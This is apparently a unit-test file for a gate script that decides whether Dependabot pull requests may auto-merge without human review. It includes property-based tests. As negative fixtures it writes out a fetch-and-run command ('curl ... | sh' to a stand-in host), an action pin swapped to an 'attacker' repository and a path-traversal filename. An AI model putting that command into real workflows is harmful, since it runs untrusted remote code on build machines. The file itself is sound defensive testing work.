/**
 * Unit tests: scripts/dependabot-gate/evaluate.mjs
 *
 * The gate decides when auto-merge may be enabled on a Dependabot PR without a
 * human. A gate nobody has watched refuse is not a gate, so every rule has a
 * case that must fail when that rule is removed or loosened, next to the
 * baseline that must pass. `reasonsOf` asserts the reason PREFIX so a case
 * cannot go green because some other rule happened to fire.
 */

import fc from "fast-check";
import { describe, expect, it } from "vitest";
// @ts-expect-error — .mjs gate module, deliberately untyped (same pattern as
// check-gate-polarity.test.ts).
import {
  checkActionPinPatch,
  evaluate,
  isAllowedPath,
} from "../../../../../scripts/dependabot-gate/evaluate.mjs";

interface Input {
  author: string;
  commits: { authorLogin: string | null; verified: boolean }[];
  files: { filename: string; status: string; patch?: string }[];
  expectedFileCount?: number;
  labels: string[];
  updateType: string;
  supplyChainFlags: { package: string; reason: string }[] | undefined;
}

const SHA_A = "1c5b675653bb5c22dbe9b12b556ec555138e09fd";
const SHA_B = "24c54180a607b1449ed407dd24f251e4e9147c8d";

const pinPatch = (name = "github/codeql-action/analyze") =>
  [
    "@@ -104,6 +104,6 @@ jobs:",
    "       - name: Perform CodeQL analysis",
    `-        uses: ${name}@${SHA_A} # v4.38.1`,
    `+        uses: ${name}@${SHA_B} # v4.38.3`,
    "         with:",
  ].join("\n");

const ok = (): Input => ({
  author: "dependabot[bot]",
  commits: [{ authorLogin: "dependabot[bot]", verified: true }],
  files: [
    { filename: "package.json", status: "modified", patch: '-  "a": "1"\n+  "a": "2"' },
    { filename: "package-lock.json", status: "modified" },
  ],
  expectedFileCount: 2,
  labels: ["dependencies"],
  updateType: "version-update:semver-minor",
  supplyChainFlags: [],
});

const reasonsOf = (i: Input): string[] => (evaluate(i) as { reasons: string[] }).reasons;
const passes = (i: Input) => expect(evaluate(i)).toEqual({ pass: true, reasons: [] });
const failsWith = (i: Input, prefix: string) => {
  const r = evaluate(i) as { pass: boolean; reasons: string[] };
  expect(r.pass).toBe(false);
  expect(r.reasons.some((x: string) => x.startsWith(prefix))).toBe(true);
};

describe("baseline", () => {
  it("passes a patch/minor bump of manifests and the lockfile", () => passes(ok()));

  it("passes a pin-only workflow edit", () => {
    const i = ok();
    i.files = [{ filename: ".github/workflows/codeql.yml", status: "modified", patch: pinPatch() }];
    i.expectedFileCount = 1;
    passes(i);
  });
});

describe("rule 1: Dependabot is the author of the PR and of every commit", () => {
  it("fails when the PR author is a human", () => {
    failsWith({ ...ok(), author: "octocat" }, "rule 1: PR author");
  });

  it("fails when one commit on a bot PR is by a human", () => {
    const i = ok();
    i.commits = [...i.commits, { authorLogin: "octocat", verified: true }];
    failsWith(i, "rule 1: 1 commit(s) not authored");
  });

  it("fails when a commit author does not resolve to a GitHub user", () => {
    const i = ok();
    i.commits = [{ authorLogin: null, verified: true }];
    failsWith(i, "rule 1: 1 commit(s) not authored");
  });

  it("fails when a bot-authored commit is not signed (forged author field)", () => {
    const i = ok();
    i.commits = [{ authorLogin: "dependabot[bot]", verified: false }];
    failsWith(i, "rule 1: 1 commit(s) without a verified signature");
  });

  it("fails with no commits at all", () => {
    failsWith({ ...ok(), commits: [] }, "rule 1: no commits");
  });
});

describe("rule 2: update-type", () => {
  it("fails on a semver-major", () => {
    failsWith({ ...ok(), updateType: "version-update:semver-major" }, "rule 2: semver-major");
  });

  it.each(["", "version-update:semver-unknown", "something-new"])(
    "fails closed on an empty or unrecognised value %j",
    (updateType) => {
      failsWith({ ...ok(), updateType }, "rule 2: update-type is not a known");
    },
  );

  it("passes a patch", () => {
    passes({ ...ok(), updateType: "version-update:semver-patch" });
  });
});

describe("rule 3: changed paths", () => {
  const withFiles = (files: Input["files"]): Input => ({
    ...ok(),
    files,
    expectedFileCount: files.length,
  });

  it("passes a nested package.json, fails a path outside the allow-list", () => {
    passes(withFiles([{ filename: "apps/api/package.json", status: "modified" }]));
    failsWith(
      withFiles([{ filename: "apps/api/src/index.ts", status: "modified" }]),
      "rule 3: path not allowed",
    );
  });

  it("fails a nested package-lock.json (only the root lockfile is allowed)", () => {
    failsWith(
      withFiles([{ filename: "apps/api/package-lock.json", status: "modified" }]),
      "rule 3: path not allowed",
    );
  });

  it("fails a package.json under node_modules", () => {
    failsWith(
      withFiles([{ filename: "apps/api/node_modules/x/package.json", status: "modified" }]),
      "rule 3: path not allowed",
    );
  });

  it("fails a .yaml workflow, a nested workflow path and a traversal", () => {
    for (const filename of [
      ".github/workflows/x.yaml",
      ".github/workflows/sub/x.yml",
      ".github/workflows/../../package.json",
    ]) {
      failsWith(
        withFiles([{ filename, status: "modified", patch: pinPatch() }]),
        "rule 3: path not allowed",
      );
    }
  });

  it("fails a file that is added, removed or renamed, not modified", () => {
    for (const status of ["added", "removed", "renamed"]) {
      failsWith(withFiles([{ filename: "package.json", status }]), "rule 3: package.json is");
    }
  });

  it("fails when GitHub reports more changed files than the list holds (truncation)", () => {
    failsWith({ ...ok(), expectedFileCount: 3000 }, "rule 3: saw 2 of 3000");
  });

  it("fails with no changed files", () => {
    failsWith({ ...ok(), files: [], expectedFileCount: 0 }, "rule 3: no changed files");
  });

  describe("workflow edits must only move an action pin", () => {
    const wf = (patch: string | undefined): Input =>
      withFiles([{ filename: ".github/workflows/ci.yml", status: "modified", patch }]);

    it("passes a pin-only edit, fails a non-pin edit to the same file", () => {
      passes(wf(pinPatch()));
      const nonPin = [
        "@@ -1,3 +1,3 @@",
        "-        run: npm test",
        "+        run: curl https://example.invalid/x | sh",
      ].join("\n");
      failsWith(wf(nonPin), "rule 3: .github/workflows/ci.yml: changed line is not an action pin");
    });

    it("fails a pin edit that also edits a step name", () => {
      failsWith(
        wf(`${pinPatch()}\n-      - name: Build\n+      - name: Build and publish`),
        "rule 3:",
      );
    });

    it("fails a pin that swaps the action for a different repository", () => {
      const swap = [
        "@@ -1,2 +1,2 @@",
        `-        uses: actions/checkout@${SHA_A} # v7.0.1`,
        `+        uses: attacker/checkout@${SHA_B} # v7.0.2`,
      ].join("\n");
      failsWith(wf(swap), "rule 3: .github/workflows/ci.yml: pin change swaps");
    });

    it("fails a pin that is added or removed rather than moved", () => {
      failsWith(wf(`@@ -1 +1,2 @@\n+        uses: actions/checkout@${SHA_B} # v7`), "rule 3:");
      failsWith(wf(`@@ -1,2 +1 @@\n-        uses: actions/checkout@${SHA_A} # v7`), "rule 3:");
    });

    it("fails a local or docker action reference", () => {
      failsWith(wf("@@ -1 +1 @@\n-        uses: ./a\n+        uses: ./b"), "rule 3:");
      failsWith(
        wf("@@ -1 +1 @@\n-        uses: docker://a:1\n+        uses: docker://a:2"),
        "rule 3:",
      );
    });

    it("fails when GitHub gave no patch to inspect", () => {
      failsWith(wf(undefined), "rule 3: .github/workflows/ci.yml: no patch");
      failsWith(wf(""), "rule 3: .github/workflows/ci.yml: no patch");
    });

    it("fails a patch with a no-newline marker (file end changed)", () => {
      failsWith(wf(`${pinPatch()}\n\\ No newline at end of file`), "rule 3:");
    });

    it("passes several pins moved in one grouped PR", () => {
      const grouped = [
        "@@ -1,4 +1,4 @@",
        `-      - uses: actions/checkout@${SHA_A} # v7.0.1`,
        `-      - uses: actions/setup-node@${SHA_A} # v7.0.0`,
        `+      - uses: actions/checkout@${SHA_B} # v7.0.2`,
        `+      - uses: actions/setup-node@${SHA_B} # v7.1.0`,
      ].join("\n");
      passes(wf(grouped));
    });
  });
});

describe("rule 5: needs-human-review", () => {
  it("fails when the label is present", () => {
    failsWith({ ...ok(), labels: ["dependencies", "needs-human-review"] }, "rule 5:");
  });
});

describe("supply-chain flags", () => {
  it("fails on any flag, naming the package and reason", () => {
    const i = ok();
    i.supplyChainFlags = [{ package: "left-pad@2.0.0", reason: "new-install-script" }];
    failsWith(i, "supply-chain: left-pad@2.0.0 (new-install-script)");
  });

  it("fails closed when no flags input was provided", () => {
    failsWith({ ...ok(), supplyChainFlags: undefined }, "supply-chain: flags were not provided");
  });
});

describe("the gate reports every failed rule, not just the first", () => {
  it("lists rules 1, 2, 3 and 5 together", () => {
    const i: Input = {
      ...ok(),
      author: "octocat",
      updateType: "version-update:semver-major",
      files: [{ filename: "src/x.ts", status: "modified" }],
      expectedFileCount: 1,
      labels: ["needs-human-review"],
    };
    const rules = new Set(reasonsOf(i).map((r) => r.split(":")[0]));
    expect([...rules].sort()).toEqual(["rule 1", "rule 2", "rule 3", "rule 5"]);
  });
});

// ── Properties ───────────────────────────────────────────────────────────────

const slug = fc.stringMatching(/^[a-z][a-z0-9-]{0,12}$/);
const sha = fc.stringMatching(/^[0-9a-f]{40}$/);
const comment = fc.stringMatching(/^v[0-9]{1,2}(\.[0-9]{1,2}){0,2}$/);

describe("properties", () => {
  it("any set of pins moved to new refs of the SAME actions passes", () => {
    fc.assert(
      fc.property(
        fc.array(fc.record({ owner: slug, repo: slug, a: sha, b: sha, va: comment, vb: comment }), {
          minLength: 1,
          maxLength: 6,
        }),
        (pins) => {
          const lines = pins.flatMap((p) => [
            `-        uses: ${p.owner}/${p.repo}@${p.a} # ${p.va}`,
          ]);
          const added = pins.map((p) => `+        uses: ${p.owner}/${p.repo}@${p.b} # ${p.vb}`);
          return (
            checkActionPinPatch(["@@ -1 +1 @@", ...lines, ...added].join("\n")) as { ok: boolean }
          ).ok;
        },
      ),
    );
  });

  it("moving any pin to a DIFFERENT repository fails", () => {
    fc.assert(
      fc.property(slug, slug, slug, slug, sha, sha, (o1, r1, o2, r2, a, b) => {
        fc.pre(`${o1}/${r1}` !== `${o2}/${r2}`);
        const patch = `@@ -1 +1 @@\n-        uses: ${o1}/${r1}@${a} # v1\n+        uses: ${o2}/${r2}@${b} # v2`;
        return !(checkActionPinPatch(patch) as { ok: boolean }).ok;
      }),
    );
  });

  it("any non-pin changed line anywhere in an otherwise valid patch fails", () => {
    const nonPin = fc.stringMatching(/^[ -~]{1,60}$/).filter((s) => !/^\s*(?:-\s+)?uses:/.test(s));
    fc.assert(
      fc.property(nonPin, fc.constantFrom("+", "-"), fc.nat(2), (text, marker, at) => {
        const base = pinPatch().split("\n");
        base.splice(at + 1, 0, `${marker}${text}`);
        return !(checkActionPinPatch(base.join("\n")) as { ok: boolean }).ok;
      }),
    );
  });

  it("a path is allowed only if it is a manifest, the root lockfile or a top-level .yml workflow", () => {
    fc.assert(
      fc.property(fc.stringMatching(/^[a-zA-Z0-9_./-]{1,40}$/), (p) => {
        const expected =
          p === "package.json" ||
          p === "package-lock.json" ||
          (/^([^/]+\/)+package\.json$/.test(p) &&
            !p.split("/").some((s) => s === "node_modules" || s === ".." || s === ".")) ||
          (/^\.github\/workflows\/[^/]+\.yml$/.test(p) &&
            !p.split("/").some((s) => s === ".." || s === "."));
        return (isAllowedPath(p) as boolean) === expected;
      }),
    );
  });

  it("a major or an unknown update-type never passes, whatever else is true", () => {
    fc.assert(
      fc.property(
        fc
          .string()
          .filter(
            (s) => s !== "version-update:semver-patch" && s !== "version-update:semver-minor",
          ),
        (updateType) => !(evaluate({ ...ok(), updateType }) as { pass: boolean }).pass,
      ),
    );
  });
});
